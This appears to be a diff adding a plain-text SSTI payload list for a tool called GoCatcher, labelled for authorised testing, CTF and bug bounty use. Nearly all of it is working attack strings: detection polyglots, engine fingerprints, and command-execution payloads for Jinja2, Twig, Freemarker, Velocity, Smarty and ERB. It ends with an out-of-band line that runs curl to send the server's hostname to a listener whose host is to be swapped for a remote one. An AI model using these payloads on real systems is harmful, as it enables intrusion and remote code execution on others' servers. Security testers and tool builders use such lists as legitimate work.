@@ -1,0 +1,43 @@
+===========================================================================
+ GoCatcher :: SSTI test payloads  (text/plain)
+ FOR AUTHORIZED TESTING / CTF / BUG BOUNTY ONLY.
+ Drop these into template-rendered inputs; a math result (e.g. 49) confirms
+ injection. Use the OOB lines to beacon back to GoCatcher when output is blind.
+===========================================================================
+
+# 1) Detection polyglot (one of these will evaluate):
+${7*7}   {{7*7}}   <%= 7*7 %>   #{7*7}   ${{7*7}}   @(7*7)   #{7*7}
+# 49 => server-side template injection.
+
+# 2) Engine fingerprint:
+{{7*'7'}}        # Jinja2 -> 7777777   |   Twig -> 49
+${7*7}           # Freemarker / Velocity / JSP EL
+#{7*7}           # Ruby (Slim/ERB-ish) / JSF
+
+# --- Jinja2 / Flask (Python) ---
+{{ config }}
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
+
+# --- Twig (PHP) ---
+{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
+{{ ['id']|filter('system') }}
+
+# --- Freemarker (Java) ---
+<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
+
+# --- Velocity (Java) ---
+#set($e="exec")$e.getClass().forName("java.lang.Runtime").getMethod("exec",$e.getClass()).invoke(...)
+
+# --- Smarty (PHP) ---
+{php}echo `id`;{/php}
+{system('id')}
+
+# --- ERB (Ruby) ---
+<%= `id` %>
+<%= system("id") %>
+
+# 3) Blind / OOB confirmation via GoCatcher (replace host for remote):
+{{ ''.__class__.__mro__[1].__subclasses__() }}   # enumerate, then:
+{{ cycler.__init__.__globals__.os.popen('curl http://127.0.0.1:8080/ssti-oob?h=$(hostname)').read() }}
